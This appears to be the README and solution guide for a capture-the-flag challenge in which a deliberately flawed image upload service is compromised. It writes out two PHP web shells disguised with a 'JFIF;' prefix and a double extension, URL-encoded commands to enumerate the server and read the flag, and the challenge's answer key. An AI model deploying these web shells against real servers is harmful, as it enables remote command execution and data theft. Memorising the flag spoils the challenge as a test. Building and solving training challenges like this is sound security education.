

# **ImageUploader CTF Challenge**

## **Challenge Details**

### **Category**
- Web Security
- File Upload Vulnerability
- Command Injection
- Base64 Encoding

### **Description**
CTF7 is a seemingly innocent image upload service that contains multiple security vulnerabilities. Participants must exploit file upload restrictions and use command injection to discover and decode a hidden flag.

---

## **Hints 🔍**

1. "Check the file extension - sometimes what you see isn't what you get..."
2. "A picture is worth a thousand words, but what if it contains code?"
3. "The flag is hidden deep within the server, but where exactly? Try exploring `/var`."
4. "Remember to decode what you find - things aren't always what they seem!"
5. "JFIF might be useful in your journey..."

---

## **Technical Details**

### **Security Flaws**
1. **Insecure File Upload**
   - The application only checks file extensions.
   - Double extension bypass possible (e.g., `shell.php.jpg`).
   - No proper MIME type validation.

2. **Command Injection**
   - Uploaded PHP files are executed as PHP code.
   - GET parameter allows arbitrary command execution.

3. **Information Disclosure**
   - Directory listing enabled in uploads folder.
   - Base64 encoded flag stored in a predictable location.

---

## **Hosting Requirements**

### **Prerequisites**
- Docker
- Docker Compose
- Git (optional)

### **Installation & Deployment**

1. **Clone the Repository**
   ```bash
   git clone https://github.com/YASHRVY7/CTF7.git
   cd CTF7
   ```

2. **Build and Run with Docker**
   ```bash
   docker-compose up --build
   ```

3. **Access the Challenge**
   - Open browser and navigate to: `http://localhost:8080`

---

## **Solution Guide**

### **Step 1: Create Payload**
Create a file named `shell.php.jpg` with the following content:

#### **Basic Payload**
```php
JFIF;
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Usage: ?cmd=command";
}
?>
```

#### **Enhanced Payload**
For better output formatting and debugging capabilities:
```php
JFIF;
<?php
// Simple shell with command execution
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>\n";
    echo "Command received: $cmd\n";
    echo "Executing...\n";
    $output = [];
    exec($cmd . " 2>&1", $output);
    echo "Output:\n";
    echo implode("\n", $output) . "\n";
    echo "</pre>";
} else {
    echo "No command provided. Use ?cmd=command";
}
?>
```

---

### **Step 2: Upload and Execute**
1. Upload the `shell.php.jpg` file through the web interface.
2. Navigate to `/uploads/shell.php.jpg` in the browser.

---

### **Step 3: Find the Flag**
This step involves exploring the server's file system to locate and retrieve the hidden flag. The process requires multiple commands and careful enumeration.

#### **1. Initial Directory Enumeration**
Start by identifying directories and files on the server.

- Check the root directory `/var`:
  ```
  http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20-la%20/var
  ```

  **Expected Output:**
  ```
  Command received: ls /var
  Executing...
  backups  cache  hidden  lib  local  lock  log  mail  opt  run  spool  tmp  www
  Return value: 0
  ```

  **Key Observation:** The `hidden` directory stands out as a potential target.

- Explore the `hidden` directory:
  ```
  http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20-la%20/var/hidden
  ```

  **Expected Output:**
  ```
  Command received: ls /var/hidden
  Executing...
  level1
  Return value: 0
  ```

  **Key Observation:** The `level1` directory indicates a nested structure.

- Dive deeper into `level1` and `level2` directories:
  ```
  http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20-la%20/var/hidden/level1/level2
  ```

  **Expected Output:**
  ```
  Command received: ls /var/hidden/level1/level2
  Executing...
  secret_flag.txt
  Return value: 0
  ```

  **Key Observation:** The `secret_flag.txt` file contains the flag.

---

#### **2. Advanced Enumeration Techniques**
If standard commands like `ls` are restricted, try alternatives:

- Using `find` to locate files:
  ```
  http://localhost:8080/uploads/shell.php.jpg?cmd=find%20/var/hidden%20-type%20f
  ```

- Using `dir` to list directory contents:
  ```
  http://localhost:8080/uploads/shell.php.jpg?cmd=dir%20/var/hidden/level1/level2/
  ```

---

#### **3. Reading the Flag File**
Use the `cat` command to read the contents of the flag file:

```
http://localhost:8080/uploads/shell.php.jpg?cmd=cat%20/var/hidden/level1/level2/secret_flag.txt
```

**Expected Output:**
```
Command received: cat /var/hidden/level1/level2/secret_flag.txt
Executing...
Q1RGe1RoMXNfMXNfWU91cl9GbDRnX0MwbmdyNHR6X1kwdV9GMHVuZF9JdH0=
Return value: 0
```

**Key Observation:** The flag is Base64-encoded. Decode it using any Base64 decoder tool or command-line utility:

```bash
echo "Q1RGe1RoMXNfMXNfWU91cl9GbDRnX0MwbmdyNHR6X1kwdV9GMHVuZF9JdH0=" | base64 --decode
```

**Decoded Flag:**
```
CTF{Th1s_1s_YOur_Fl4g_C0ngr4tz_Y0u_F0und_It}
```

---

## **Payload Explanation**

The payload (`shell.php.jpg`) is crafted to bypass upload restrictions and enable command execution. Let's break down each component:

### **1. File Name Structure**
- `shell.php.jpg`: Uses double extension to bypass file type checks.
  - The server sees `.jpg` and thinks it's an image.
  - But PHP will still execute it as a `.php` file.

### **2. Content Breakdown**
#### **Basic Payload**
```php
JFIF;
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Usage: ?cmd=command";
}
?>
```

#### **Enhanced Payload**
```php
JFIF;
<?php
// Simple shell with command execution
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>\n";
    echo "Command received: $cmd\n";
    echo "Executing...\n";
    $output = [];
    exec($cmd . " 2>&1", $output);
    echo "Output:\n";
    echo implode("\n", $output) . "\n";
    echo "</pre>";
} else {
    echo "No command provided. Use ?cmd=command";
}
?>
```

---

### **Key Features of Enhanced Payload**
1. **Enhanced Output Formatting**
   - Uses `<pre>` tags for better output readability.
   - Shows detailed execution steps and command status.
   - Captures and formats both stdout and stderr (`2>&1`).

2. **Command Handling**
   - Uses `exec()` instead of `system()` for more controlled output.
   - Stores output in an array for better manipulation.
   - Provides more verbose feedback about command execution.

3. **User Experience**
   - More detailed error messages.
   - Structured output presentation.
   - Better debugging capabilities.

---

## **Security Measures**
- Apache mod_security enabled.
- Security headers configured.
- File extension validation.
- Upload directory permissions set.
- Flag file permissions restricted.
- Base64 encoded flag.

---

## **Flag Format**
- Encoded: `Q1RGe1RoMXNfMXNfWU91cl9GbDRnX0MwbmdyNHR6X1kwdV9GMHVuZF9JdH0=`
- Decoded: `CTF{Th1s_1s_YOur_Fl4g_C0ngr4tz_Y0u_F0und_It}`

---

## **Conclusion**
This challenge demonstrates common vulnerabilities in web applications, such as insecure file uploads and command injection. By completing this challenge, participants will gain hands-on experience in exploiting these flaws and retrieving sensitive information.

Good luck, and happy hacking!  

--- 

This updated version provides a clear, step-by-step guide for participants while highlighting the technical details and security implications of the challenge.
